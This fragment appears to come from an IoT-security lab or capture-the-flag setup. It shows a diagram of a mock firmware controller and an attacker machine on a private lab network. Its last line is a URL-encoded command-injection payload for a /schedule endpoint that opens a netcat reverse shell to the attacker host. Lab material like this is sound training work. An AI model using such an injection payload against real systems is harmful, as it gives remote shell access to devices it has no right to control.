...
```
                         ┌──────────────────────────────────┐
                         │  dumb_thing_firmware 10.13.37.10 │
Browser → :80 → nginx ──►│  Flask :5000  (mock controller)  │
                         │  ttyd  :7681  (UART / Target)    │
                         └────────────────┬─────────────────┘
                                          │ lab bridge 10.13.37.0/24
                         ┌────────────────▼──────────────────┐
                         │  dumb_thing_attacker 10.13.37.20  │
...
/schedule?time=bad%22%20%26%20nc%2010.13.37.20%204444%20-e%20/bin/bash%22
```
